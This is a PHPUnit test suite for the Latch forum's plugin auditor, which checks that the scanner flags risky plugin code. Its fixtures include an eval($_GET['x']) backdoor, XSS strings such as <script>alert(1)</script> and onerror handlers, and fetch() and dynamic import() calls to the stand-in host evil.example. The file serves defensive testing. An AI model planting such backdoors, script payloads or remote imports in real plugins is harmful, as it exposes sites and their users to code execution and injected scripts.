<?php

declare(strict_types=1);

/**
 * Copyright (c) 2026 Latch contributors
 *
 * SPDX-License-Identifier: MIT
 */


namespace Latch\Tests;

use Latch\Core\Plugins\PluginAuditFinding;
use Latch\Core\Plugins\PluginAuditor;
use PHPUnit\Framework\TestCase;

final class PluginAuditorTest extends TestCase
{
    private string $root;
    private PluginAuditor $auditor;

    protected function setUp(): void
    {
        $this->root = dirname(__DIR__);
        $this->auditor = new PluginAuditor(
            $this->root,
            $this->root . '/plugins',
            $this->root . '/storage',
        );
    }

    public function testExamplePluginPassesAudit(): void
    {
        $report = $this->auditor->auditTarget('docs/plugins/example');

        $this->assertSame('example', $report->slug);
        $this->assertTrue($report->passed());
        $this->assertSame(0, $report->criticalCount());
        $this->assertSame(0, $report->warnCount());
    }

    public function testForumStatsPluginPassesAudit(): void
    {
        $report = $this->auditor->auditPath(CatalogPath::plugin('forum-stats'));

        $this->assertTrue($report->passed(), $report->toHuman());
        $this->assertSame(0, $report->warnCount());
    }

    public function testGitReleasePluginPassesAudit(): void
    {
        $root = CatalogPath::root();
        if (!is_dir($root . '/git-release')) {
            $this->markTestSkipped('git-release plugin not present in Latch-plugins');
        }

        $report = $this->auditor->auditPath($root . '/git-release');

        $this->assertTrue($report->passed(), $report->toHuman());
    }

    public function testFragmentCacheWithoutHookIsCritical(): void
    {
        $dir = $this->makeTempPlugin('cache-frag-missing', '<?php', [
            'cache' => ['guest_page' => 'fragment'],
        ]);

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('manifest_cache_fragment', $this->findingCodes($report->findings));
    }

    public function testFragmentCacheHookMustBeDeclared(): void
    {
        $dir = $this->makeTempPlugin('cache-frag-hook', '<?php', [
            'hooks' => ['bootstrap'],
            'cache' => [
                'guest_page' => 'fragment',
                'fragment' => 'home.after_boards',
            ],
        ]);

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('manifest_cache_fragment_hook', $this->findingCodes($report->findings));
    }

    public function testClientCacheWithoutRouteIsCritical(): void
    {
        $dir = $this->makeTempPlugin('cache-client-missing', '<?php', [
            'cache' => ['guest_page' => 'client'],
        ]);

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('manifest_cache_client', $this->findingCodes($report->findings));
    }

    public function testClientCacheRejectsExternalRoute(): void
    {
        $dir = $this->makeTempPlugin('cache-client-external', '<?php', [
            'cache' => [
                'guest_page' => 'client',
                'client' => 'https://evil.example/widget.json',
            ],
        ]);

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('manifest_cache_client_route', $this->findingCodes($report->findings));
    }

    public function testValidFragmentCacheConfigPasses(): void
    {
        $dir = $this->makeTempPlugin('cache-frag-ok', '<?php', [
            'hooks' => ['home.after_boards'],
            'cache' => [
                'guest_page' => 'fragment',
                'fragment' => 'home.after_boards',
                'invalidate_on' => ['plugin'],
            ],
        ]);

        $report = $this->auditor->auditPath($dir);

        $this->assertNotContains('manifest_cache_fragment', $this->findingCodes($report->findings));
        $this->assertNotContains('manifest_cache_fragment_hook', $this->findingCodes($report->findings));
    }

    public function testImageUploadPluginPassesAudit(): void
    {
        $report = $this->auditor->auditPath(CatalogPath::plugin('image-upload'));

        $this->assertTrue($report->passed(), $report->toHuman());
        $this->assertSame(0, $report->warnCount());
    }

    public function testWordFilterPluginPassesAudit(): void
    {
        $report = $this->auditor->auditPath(CatalogPath::plugin('word-filter'));

        $this->assertTrue($report->passed(), $report->toHuman());
        $this->assertSame(0, $report->warnCount());
    }

    public function testBadexamplePluginFailsAudit(): void
    {
        $report = $this->auditor->auditTarget('docs/plugins/badexample');

        $this->assertSame('badexample', $report->slug);
        $this->assertFalse($report->passed());
        $this->assertGreaterThanOrEqual(3, $report->criticalCount());
        $this->assertContains('dangerous_eval', $this->findingCodes($report->findings));
        $this->assertContains('network_file_get_contents', $this->findingCodes($report->findings));
        $this->assertContains('forbidden_write_target', $this->findingCodes($report->findings));
    }

    public function testWarnexamplePluginPassesWithWarnings(): void
    {
        $report = $this->auditor->auditTarget('docs/plugins/warnexample');

        $this->assertTrue($report->passed(), $report->toHuman());
        $this->assertFalse($report->enableAllowed(), $report->toHuman());
        $this->assertSame(0, $report->criticalCount());
        $this->assertGreaterThan(0, $report->warnCount());
        $this->assertContains('markup_script_tag', $this->findingCodes($report->findings));
        $this->assertContains('js_eval', $this->findingCodes($report->findings));
    }

    public function testCatalogPluginsAllowEnable(): void
    {
        foreach (['forum-stats', 'image-upload', 'word-filter', 'spam-bridge', 'slack-notify'] as $slug) {
            $report = $this->auditor->auditPath(CatalogPath::plugin($slug));
            $this->assertTrue($report->enableAllowed(), $slug . ': ' . $report->toHuman());
        }
    }

    public function testResolvesCatalogPluginPath(): void
    {
        $catalog = CatalogPath::plugin('forum-stats');
        $resolved = $this->auditor->resolvePath($catalog);

        $this->assertSame(realpath($catalog) ?: $catalog, $resolved);
    }

    public function testResolvesInstalledPluginSlug(): void
    {
        $bySlug = $this->auditor->resolvePath('md-import');
        $byRelative = $this->auditor->resolvePath('plugins/md-import');

        $this->assertSame($bySlug, $byRelative);
        $this->assertStringEndsWith('/plugins/md-import', $bySlug);
    }

    public function testResolvesDocsPluginPath(): void
    {
        $resolved = $this->auditor->resolvePath('docs/plugins/example');

        $this->assertStringEndsWith('/docs/plugins/example', $resolved);
    }

    public function testDetectsEvalAsCritical(): void
    {
        $dir = $this->makeTempPlugin('evil-eval', <<<'PHP'
<?php
eval($_GET['x']);
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertFalse($report->passed());
        $this->assertGreaterThan(0, $report->criticalCount());
        $this->assertContains('dangerous_eval', $this->findingCodes($report->findings));
    }

    public function testDetectsUndeclaredNetwork(): void
    {
        $dir = $this->makeTempPlugin('evil-net', <<<'PHP'
<?php
file_get_contents('https://example.com/hook');
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertFalse($report->passed());
        $this->assertContains('network_file_get_contents', $this->findingCodes($report->findings));
    }

    public function testAllowsNetworkWhenDeclared(): void
    {
        $dir = $this->makeTempPlugin('ok-net', <<<'PHP'
<?php
file_get_contents('https://example.com/hook');
PHP, [], true);

        $report = $this->auditor->auditPath($dir);

        $this->assertTrue($report->passed());
    }

    public function testReportJsonShape(): void
    {
        $report = $this->auditor->auditTarget('docs/plugins/example');
        $data = $report->toArray();

        $this->assertArrayHasKey('passed', $data);
        $this->assertArrayHasKey('summary', $data);
        $this->assertArrayHasKey('findings', $data);
        $this->assertTrue($data['passed']);
    }

    public function testMarkupScriptTagWarns(): void
    {
        $dir = $this->makeTempPlugin('markup-script', <<<'PHP'
<?php
return '<script>alert(1)</script>';
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertTrue($report->passed());
        $this->assertContains('markup_script_tag', $this->findingCodes($report->findings));
        $this->assertMarkupSeverityIsWarn($report->findings, 'markup_script_tag');
    }

    public function testMarkupOnerrorWarns(): void
    {
        $dir = $this->makeTempPlugin('markup-onerror', <<<'PHP'
<?php
return '<img onerror=alert(1)>';
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('markup_inline_event_handler', $this->findingCodes($report->findings));
    }

    public function testMarkupJavascriptUrlWarns(): void
    {
        $dir = $this->makeTempPlugin('markup-js-url', <<<'PHP'
<?php
return '<a href="javascript:void(0)">';
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('markup_javascript_url', $this->findingCodes($report->findings));
    }

    public function testBenignButtonHtmlNoMarkupWarning(): void
    {
        $dir = $this->makeTempPlugin('markup-button', <<<'PHP'
<?php
return '<button type="button" class="composer-btn" data-action="image-upload"><span>Image</span></button>';
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertTrue($report->passed());
        $this->assertSame([], array_filter(
            $this->findingCodes($report->findings),
            static fn (string $code): bool => str_starts_with($code, 'markup_'),
        ));
    }

    public function testForumStatsStyleHeredocNoMarkupWarning(): void
    {
        $dir = $this->makeTempPlugin('markup-heredoc', <<<'PHP'
<?php
return <<<HTML
<section class="forum-stats">
    <div class="admin-stat-card">
        <span class="admin-stat-value">1</span>
    </div>
</section>
HTML;
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertSame([], array_filter(
            $this->findingCodes($report->findings),
            static fn (string $code): bool => str_starts_with($code, 'markup_'),
        ));
    }

    public function testJsEvalWarns(): void
    {
        $dir = $this->makeTempPluginWithJs('js-eval', '<?php', "eval('x');");

        $report = $this->auditor->auditPath($dir);

        $this->assertTrue($report->passed());
        $this->assertContains('js_eval', $this->findingCodes($report->findings));
    }

    public function testJsInnerHtmlWarns(): void
    {
        $dir = $this->makeTempPluginWithJs('js-inner', '<?php', 'el.innerHTML = user;');

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('js_inner_html', $this->findingCodes($report->findings));
    }

    public function testJsRelativeFetchNoWarning(): void
    {
        $dir = $this->makeTempPluginWithJs('js-fetch-rel', '<?php', "fetch('/plugin/foo');");

        $report = $this->auditor->auditPath($dir);

        $this->assertNotContains('js_fetch_external', $this->findingCodes($report->findings));
    }

    public function testJsExternalFetchWarns(): void
    {
        $dir = $this->makeTempPluginWithJs('js-fetch-ext', '<?php', "fetch('https://evil.example/');");

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('js_fetch_external', $this->findingCodes($report->findings));
    }

    public function testJsDynamicImportExternalWarns(): void
    {
        $dir = $this->makeTempPluginWithJs(
            'js-import-ext',
            '<?php',
            "import('https://evil.example/mod.js');",
            'assets/module.mjs',
        );

        $report = $this->auditor->auditPath($dir);

        $this->assertTrue($report->passed());
        $this->assertContains('js_dynamic_import_external', $this->findingCodes($report->findings));
    }

    public function testJsRelativeDynamicImportNoWarning(): void
    {
        $dir = $this->makeTempPluginWithJs(
            'js-import-rel',
            '<?php',
            "import('./chunk.mjs');",
            'assets/module.mjs',
        );

        $report = $this->auditor->auditPath($dir);

        $this->assertNotContains('js_dynamic_import_external', $this->findingCodes($report->findings));
        $this->assertTrue($report->passed());
    }

    public function testMjsFileScanned(): void
    {
        $dir = $this->makeTempPluginWithJs('js-mjs', '<?php', "eval('x');", 'assets/module.mjs');

        $report = $this->auditor->auditPath($dir);

        $this->assertContains('js_eval', $this->findingCodes($report->findings));
    }

    public function testVendorJsSkipped(): void
    {
        $dir = $this->makeTempPlugin('js-vendor', '<?php');
        mkdir($dir . '/vendor', 0777, true);
        file_put_contents($dir . '/vendor/evil.js', "eval('x');");
        $this->addTempDir($dir);

        $report = $this->auditor->auditPath($dir);

        $this->assertNotContains('js_eval', $this->findingCodes($report->findings));
    }

    public function testMarkupNeverCritical(): void
    {
        $dir = $this->makeTempPlugin('markup-only', <<<'PHP'
<?php
return '<script>alert(1)</script>';
PHP);

        $report = $this->auditor->auditPath($dir);

        foreach ($report->findings as $finding) {
            if (!str_starts_with($finding->code, 'markup_')) {
                continue;
            }

            $this->assertSame(PluginAuditFinding::SEVERITY_WARN, $finding->severity);
        }
    }

    public function testMarkupPlusPhpEvalIsCritical(): void
    {
        $dir = $this->makeTempPlugin('markup-eval', <<<'PHP'
<?php
return '<script>eval(x)</script>';
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertFalse($report->passed());
        $this->assertContains('dangerous_eval', $this->findingCodes($report->findings));
        $this->assertContains('markup_script_tag', $this->findingCodes($report->findings));
    }

    public function testMarkupMultipleCodesOneLine(): void
    {
        $dir = $this->makeTempPlugin('markup-multi', <<<'PHP'
<?php
return '<script onclick=1 onerror=alert(1)>';
PHP);

        $report = $this->auditor->auditPath($dir);
        $markupCodes = array_values(array_filter(
            $this->findingCodes($report->findings),
            static fn (string $code): bool => str_starts_with($code, 'markup_'),
        ));

        $this->assertContains('markup_script_tag', $markupCodes);
        $this->assertContains('markup_inline_event_handler', $markupCodes);
        $this->assertCount(2, $markupCodes);
    }

    public function testMarkupDedupeSameCodeSameLine(): void
    {
        $dir = $this->makeTempPlugin('markup-dedupe', <<<'PHP'
<?php
return '<script>alert(1)</script>';
PHP);

        $report = $this->auditor->auditPath($dir);
        $scriptTags = array_filter(
            $report->findings,
            static fn (PluginAuditFinding $f): bool => $f->code === 'markup_script_tag',
        );

        $this->assertCount(1, $scriptTags);
    }

    public function testPsr4MismatchIsCritical(): void
    {
        $dir = $this->makeTempPlugin('psr4-bad', '<?php');
        $studly = \Latch\Core\Plugins\PluginManifest::studlySlug('psr4-bad');
        file_put_contents($dir . '/src/RegistrationEnforcer.php', <<<PHP
<?php

namespace Latch\\Plugins\\{$studly};

class AppRegistrationEnforcer
{
}
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertFalse($report->passed());
        $this->assertFalse($report->enableAllowed());
        $this->assertContains('psr4_autoload_mismatch', $this->findingCodes($report->findings));
    }

    public function testPsr4ValidLayoutPasses(): void
    {
        $dir = $this->makeTempPlugin('psr4-ok', '<?php');
        $studly = \Latch\Core\Plugins\PluginManifest::studlySlug('psr4-ok');
        file_put_contents($dir . '/src/AppRegistrationEnforcer.php', <<<PHP
<?php

namespace Latch\\Plugins\\{$studly};

class AppRegistrationEnforcer
{
}
PHP);

        $report = $this->auditor->auditPath($dir);

        $this->assertNotContains('psr4_autoload_mismatch', $this->findingCodes($report->findings));
    }

    public function testRuntimeStorageNotWritableIsCritical(): void
    {
        $slug = 'audit-runtime-' . bin2hex(random_bytes(3));
        $dir = $this->root . '/plugins/' . $slug;
        mkdir($dir . '/src', 0777, true);
        file_put_contents($dir . '/plugin.json', json_encode([
            'name' => 'Runtime test',
            'slug' => $slug,
            'version' => '1.0.0',
            'min_latch_version' => '0.3.0',
            'hooks' => ['bootstrap'],
            'permissions' => ['filesystem' => [], 'network' => [], 'config' => []],
        ], JSON_THROW_ON_ERROR));
        file_put_contents($dir . '/src/Plugin.php', '<?php');
        $this->addTempDir($dir);

        $storage = $this->root . '/storage/plugins/' . $slug;
        if (is_dir($storage)) {
            chmod($storage, 0777);
        }

        mkdir($storage, 0555, true);
        $this->addTempDir($storage);

        try {
            $report = $this->auditor->auditPath($dir);
            $this->assertContains('runtime_storage_not_writable', $this->findingCodes($report->findings));
            $this->assertFalse($report->enableAllowed());
        } finally {
            if (is_dir($storage)) {
                chmod($storage, 0777);
            }
        }
    }

    public function testRuntimeChecksSkippedWhenStorageAbsent(): void
    {
        $slug = 'runtime-absent-' . bin2hex(random_bytes(3));
        $dir = $this->makeTempPlugin($slug, '<?php');

        $report = $this->auditor->auditPath($dir);
        $runtimeCodes = array_filter(
            $this->findingCodes($report->findings),
            static fn (string $code): bool => str_starts_with($code, 'runtime_'),
        );

        $this->assertSame([], array_values($runtimeCodes));
    }

    /**
     * @param list<PluginAuditFinding> $findings
     * @return list<string>
     */
    private function findingCodes(array $findings): array
    {
        return array_map(static fn (PluginAuditFinding $f): string => $f->code, $findings);
    }

    /**
     * @param list<PluginAuditFinding> $findings
     */
    private function assertMarkupSeverityIsWarn(array $findings, string $code): void
    {
        foreach ($findings as $finding) {
            if ($finding->code !== $code) {
                continue;
            }

            $this->assertSame(PluginAuditFinding::SEVERITY_WARN, $finding->severity);

            return;
        }

        $this->fail("Expected finding code {$code}");
    }

    /**
     * @param array<string, mixed> $manifestOverrides
     */
    private function makeTempPlugin(string $slug, string $phpBody, array $manifestOverrides = [], bool $network = false): string
    {
        $parent = sys_get_temp_dir() . '/latch-plugin-audit-' . bin2hex(random_bytes(4));
        mkdir($parent, 0777, true);
        $dir = $parent . '/' . $slug;
        mkdir($dir . '/src', 0777, true);

        $manifest = array_merge([
            'name' => 'Test ' . $slug,
            'slug' => $slug,
            'version' => '1.0.0',
            'min_latch_version' => '0.3.0',
            'hooks' => ['bootstrap'],
            'permissions' => [
                'filesystem' => [],
                'network' => $network ? true : [],
                'config' => [],
            ],
        ], $manifestOverrides);

        file_put_contents($dir . '/plugin.json', json_encode($manifest, JSON_THROW_ON_ERROR));

        file_put_contents($dir . '/src/Plugin.php', $phpBody);

        $this->addTempDir($parent);

        return $dir;
    }

    private function makeTempPluginWithJs(
        string $slug,
        string $phpBody,
        string $jsBody,
        string $jsName = 'assets/app.js',
    ): string {
        $dir = $this->makeTempPlugin($slug, $phpBody);
        $jsPath = $dir . '/' . $jsName;
        mkdir(dirname($jsPath), 0777, true);
        file_put_contents($jsPath, $jsBody);

        return $dir;
    }

    private function addTempDir(string $dir): void
    {
        $this->addToAssertionCount(0);
        register_shutdown_function(static function () use ($dir): void {
            if (!is_dir($dir)) {
                return;
            }

            $iterator = new \RecursiveIteratorIterator(
                new \RecursiveDirectoryIterator($dir, \FilesystemIterator::SKIP_DOTS),
                \RecursiveIteratorIterator::CHILD_FIRST,
            );

            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    @rmdir($file->getPathname());
                } else {
                    @unlink($file->getPathname());
                }
            }

            @rmdir($dir);
        });
    }
}